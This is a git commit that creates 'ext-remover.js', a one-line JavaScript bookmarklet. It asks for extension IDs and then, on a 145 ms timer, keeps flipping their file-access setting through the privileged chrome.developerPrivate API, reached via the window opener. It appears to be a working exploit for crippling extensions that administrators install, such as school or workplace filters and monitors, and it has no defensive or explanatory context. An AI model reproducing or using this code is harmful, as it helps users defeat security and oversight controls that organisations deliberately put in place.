e818785e3051f44cb14d16e0ad8c1e13ad574ead
Bullet <101953487+idkbullet@users.noreply.github.com>
2023-04-04 10:52:49 -0400

    Create ext-remover.js

---
+++ ext-remover.js
@@ -0,0 +1,1 @@
+javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 145);
